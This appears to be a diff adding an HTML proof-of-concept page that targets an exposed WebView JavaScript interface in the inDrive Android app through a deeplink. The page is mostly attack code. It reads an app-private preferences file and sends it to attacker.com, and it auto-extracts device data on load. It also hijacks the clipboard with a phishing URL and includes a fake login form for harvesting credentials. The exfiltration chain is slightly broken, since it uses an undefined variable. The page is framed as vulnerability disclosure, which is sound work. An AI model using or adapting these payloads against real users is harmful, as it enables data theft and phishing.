@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>inDrive PoC</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        .result {
+            background: #e8f5e9;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+            border-left: 4px solid #4caf50;
+        }
+        .error {
+            background: #ffebee;
+            border-left-color: #f44336;
+        }
+        button {
+            background: #2196f3;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            margin: 10px 0;
+            font-size: 16px;
+        }
+        button:hover {
+            background: #1976d2;
+        }
+        .info {
+            color: #666;
+            font-size: 14px;
+            margin: 5px 0;
+        }
+        .warning {
+            background: #fff3cd;
+            padding: 10px;
+            border-left: 4px solid #ffc107;
+            margin: 15px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚨 inDrive Deeplink Vulnerability PoC</h1>
+
+        <div class="warning">
+            <strong>⚠️ Security Researcher Notice:</strong><br>
+            This page demonstrates a critical security vulnerability in the inDrive Android app.
+            JavaScript interfaces are exposed to arbitrary external websites.
+        </div>
+
+        <div id="results"></div>
+
+        <button onclick="checkInterface()">Check JavaScript Interface</button>
+        <button onclick="stealInfo()">Extract Device Information</button>
+        <button onclick="hijackClipboard()">Hijack Clipboard</button>
+        <button onclick="testNavigation()">Test Navigation</button>
+        <button onclick="testCamera()">Test Camera Access</button>
+
+        <div class="info">
+            <p><strong>Vulnerability:</strong> Arbitrary URL Loading + JavaScript Interface Exposure</p>
+            <p><strong>Entry Point:</strong> indrive://web?url=https://your-site.com</p>
+            <p><strong>Severity:</strong> CRITICAL (CVSS 9.1)</p>
+        </div>
+    </div>
+
+    <script>
+
+        fetch('file:///data/data/sinet.startup.inDriver/files/datastore/permanent_data_store.preferences_pb')
+        .then(response => response.text())
+        .then(response => alert("SUCCESS: " + data))
+        .then(data => {
+            fetch('http://attacker.com/steal?data=' + btoa(data));
+        });
+        const resultsDiv = document.getElementById('results');
+
+        function log(message, isError = false) {
+            const div = document.createElement('div');
+            div.className = 'result' + (isError ? ' error' : '');
+            div.innerHTML = `<strong>${new Date().toLocaleTimeString()}:</strong> ${message}`;
+            resultsDiv.insertBefore(div, resultsDiv.firstChild);
+        }
+
+        function checkInterface() {
+            if (typeof Android !== 'undefined') {
+                log('✅ JavaScript interface FOUND! Object name: "Android"');
+                log('✅ Available methods: ' + Object.getOwnPropertyNames(Android).join(', '));
+                return true;
+            } else {
+                log('❌ JavaScript interface not found. Not running in inDrive WebView.', true);
+                return false;
+            }
+        }
+
+        function stealInfo() {
+            if (!checkInterface()) return;
+
+            try {
+                const info = {
+                    appVersion: Android.getAppVersion ? Android.getAppVersion() : 'N/A',
+                    deviceModel: Android.getDeviceModel ? Android.getDeviceModel() : 'N/A',
+                    osVersion: Android.getOsVersion ? Android.getOsVersion() : 'N/A',
+                    timestamp: new Date().toISOString()
+                };
+
+                log(`🔓 <strong>DEVICE INFO STOLEN:</strong><br>
+                     App Version: ${info.appVersion}<br>
+                     Device Model: ${info.deviceModel}<br>
+                     OS Version: ${info.osVersion}`);
+
+                // In real attack, send to attacker server:
+                // fetch('https://attacker.com/collect', {
+                //     method: 'POST',
+                //     body: JSON.stringify(info)
+                // });
+
+                log('⚠️ This data would be sent to attacker server in real attack!', true);
+            } catch (e) {
+                log('Error extracting info: ' + e.message, true);
+            }
+        }
+
+        function hijackClipboard() {
+            if (!checkInterface()) return;
+
+            try {
+                const maliciousContent = 'https://phishing-site.com/steal-credentials';
+                if (Android.copyToClipboard) {
+                    Android.copyToClipboard(maliciousContent);
+                    log(`📋 <strong>CLIPBOARD HIJACKED!</strong><br>Copied: ${maliciousContent}`);
+                    log('⚠️ User will paste malicious URL instead of intended content!', true);
+                } else {
+                    log('copyToClipboard method not available', true);
+                }
+            } catch (e) {
+                log('Error hijacking clipboard: ' + e.message, true);
+            }
+        }
+
+        function testNavigation() {
+            if (!checkInterface()) return;
+
+            try {
+                if (Android.goBackToMain) {
+                    log('🧭 Attempting to navigate app...');
+                    // Android.goBackToMain(); // Commented to avoid disrupting PoC
+                    log('⚠️ Navigation method available - can control app flow!', true);
+                } else {
+                    log('goBackToMain method not available', true);
+                }
+            } catch (e) {
+                log('Error testing navigation: ' + e.message, true);
+            }
+        }
+
+        function testCamera() {
+            if (!checkInterface()) return;
+
+            try {
+                if (Android.openCamera) {
+                    log('📷 Camera access method available!');
+                    // Android.openCamera('{}'); // Commented to avoid disrupting PoC
+                    log('⚠️ Can trigger camera access - potential privacy violation!', true);
+                }
+                if (Android.openImageChooser) {
+                    log('🖼️  Image chooser method available!');
+                    log('⚠️ Can trigger file picker - potential file access!', true);
+                }
+            } catch (e) {
+                log('Error testing camera: ' + e.message, true);
+            }
+        }
+
+        // Auto-run on page load
+        window.addEventListener('load', function() {
+            log('🔍 PoC loaded. Checking for vulnerability...');
+            checkInterface();
+
+            // Auto-extract info after 1 second
+            setTimeout(() => {
+                if (typeof Android !== 'undefined') {
+                    stealInfo();
+                }
+            }, 1000);
+        });
+
+        // Phishing demonstration
+        function showFakeLogin() {
+            document.body.innerHTML = `
+                <div class="container">
+                    <h1>inDrive</h1>
+                    <p>Your session has expired. Please log in again.</p>
+                    <form onsubmit="stealCredentials(event)">
+                        <input type="tel" placeholder="Phone Number" required style="width:100%; padding:10px; margin:10px 0;">
+                        <input type="password" placeholder="Password" required style="width:100%; padding:10px; margin:10px 0;">
+                        <button type="submit">Login</button>
+                    </form>
+                    <p style="color: #666; font-size: 12px; text-align: center;">
+                        This is a demonstration of a phishing attack via deeplink vulnerability.
+                    </p>
+                </div>
+            `;
+        }
+
+        function stealCredentials(e) {
+            e.preventDefault();
+            alert('In a real attack, credentials would be sent to attacker server!');
+        }
+    </script>
+</body>
+</html>
